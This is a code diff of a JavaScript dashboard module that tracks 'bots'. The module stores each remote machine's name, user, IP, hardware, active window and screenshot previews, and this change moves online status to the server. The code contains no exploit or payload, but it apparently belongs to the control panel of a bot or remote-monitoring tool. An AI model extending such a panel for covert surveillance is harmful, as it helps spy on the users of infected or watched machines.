@@ -1,108 +1,84 @@
-// frontend/dashboard/js/modules/data/clients.js
-
 let clients = {};
 const emit = (name, detail = null) => window.dispatchEvent(new CustomEvent(name, { detail }));
 
+/**
+ * Массовое обновление (обычно при загрузке страницы)
+ */
 export const updateClients = (list) => {
-    let hasChanges = false;
     list.forEach(c => {
-        if (!clients[c.id]) {
-            clients[c.id] = { 
-                status: 'offline', 
-                lastHB: 0, 
-                lastPreview: null,
-                ...c 
-            };
-            hasChanges = true;
-        }
+        // Просто сохраняем всё, что прислал сервер (БД + статус)
+        clients[c.id] = { 
+            ...c,
+            lastPreview: clients[c.id]?.lastPreview || null 
+        };
     });
-    if (hasChanges) emit('clientsUpdated');
+    emit('clientsUpdated');
 };
 
-export const updateClient = (data, isLive = false) => {
+/**
+ * Одиночное обновление (события DataScribe или смена статуса)
+ */
+export const updateClient = (data) => {
     if (!data?.id) return;
+
     const old = clients[data.id];
     
-    // Если бота нет в локальном сторе, и мы не можем его создать — выходим
-    if (!old && !isLive) return;
+    // Если бота нет в базе, создаем его только если данных достаточно (есть pc_name)
+    // Иначе это просто "пакет смерти" для несуществующего бота
+    if (!old && !data.pc_name) return;
 
-    const newStatus = isLive ? 'online' : (old?.status || 'offline');
-    const newHB = isLive ? Date.now() : (old?.lastHB || 0);
-
-    // СОЗДАЕМ ОБЪЕКТ ОБНОВЛЕНИЯ
-    // Мы берем старые данные и накладываем новые только если они реально пришли в пакете
-    const updatedFields = {};
-    
-    // Список полей, которые мы обновляем только если они не пустые в пришедшем 'data'
-    const fieldsToSync = ['loc', 'user', 'pc_name', 'active_window', 'last_active', 'ip', 'os', 'hw'];
-
-    fieldsToSync.forEach(field => {
-        const val = data[field];
-        // Игнорируем: undefined, null, пустую строку, "0.0.0.0", и строковые "None"/"null"
-        const isInvalid = (
-            val === undefined || 
-            val === null || 
-            val === '' || 
-            val === '0.0.0.0' || 
-            val === 'None' || 
-            val === 'null'
-        );
-
-        if (!isInvalid) {
-            updatedFields[field] = val;
-        }
-    });
-
+    // Склеиваем старые данные с новыми
+    // Иерархия: Новые данные от сервера ПЕРЕКРЫВАЮТ старые.
     clients[data.id] = {
-        ...old,           // Сохраняем всё, что было (из БД или прошлых обновлений)
-        ...updatedFields, // Накладываем только живые данные от бота
-        status: newStatus,
-        lastHB: newHB
+        ...old,
+        ...data
     };
 
-    // Генерируем событие для перерисовки
-    if (!old || old.status !== newStatus) {
-        emit('clientsUpdated');
-    } else {
-        emit('clientUpdated', clients[data.id]);
-    }
+    // Всегда уведомляем UI, так как статус или данные окна изменились
+    emit('clientsUpdated');
 };
 
-// ВОЗВРАЩЕНО: Необходимые функции для работы connection.js и удаления
+/**
+ * Установка превью (скриншота) с очисткой памяти
+ */
 export const setClientPreview = (id, url) => {
     if (!clients[id]) return;
-    if (clients[id].lastPreview?.startsWith('blob:')) {
+    
+    // Освобождаем память от старого Blob URL, чтобы вкладка не "толстела"
+    if (clients[id].lastPreview && clients[id].lastPreview.startsWith('blob:')) {
         URL.revokeObjectURL(clients[id].lastPreview);
     }
     clients[id].lastPreview = url;
 };
 
+/**
+ * Полное удаление бота из интерфейса
+ */
 export const removeClient = (id) => {
     if (clients[id]) {
         if (clients[id].lastPreview?.startsWith('blob:')) {
             URL.revokeObjectURL(clients[id].lastPreview);
         }
         delete clients[id];
-        emit('clientRemoved');
+        emit('clientsUpdated');
     }
 };
 
-export const checkDeadClients = () => {
-    const now = Date.now();
-    let changed = false;
-    Object.values(clients).forEach(c => {
-        if (c.status === 'online' && (now - c.lastHB) > 10000) {
-            c.status = 'offline';
-            changed = true;
-        }
-    });
-    if (changed) emit('clientsUpdated');
-};
+/**
+ * ЛОГИКА ТАЙМЕРОВ УДАЛЕНА.
+ * Фронтенд больше не гасит ботов сам. 
+ * Источник статуса — только сервер.
+ */
 
+/**
+ * Получение списка для отрисовки (Сортировка: Сначала Онлайн, потом по ID)
+ */
 export const getAllClients = () => {
     return Object.values(clients).sort((a, b) => {
-        if (a.status === 'online' && b.status !== 'online') return -1;
-        if (a.status !== 'online' && b.status === 'online') return 1;
+        const aOn = a.status === 'online';
+        const bOn = b.status === 'online';
+        if (aOn && !bOn) return -1;
+        if (!aOn && bOn) return 1;
         return a.id.localeCompare(b.id);
     });
 };
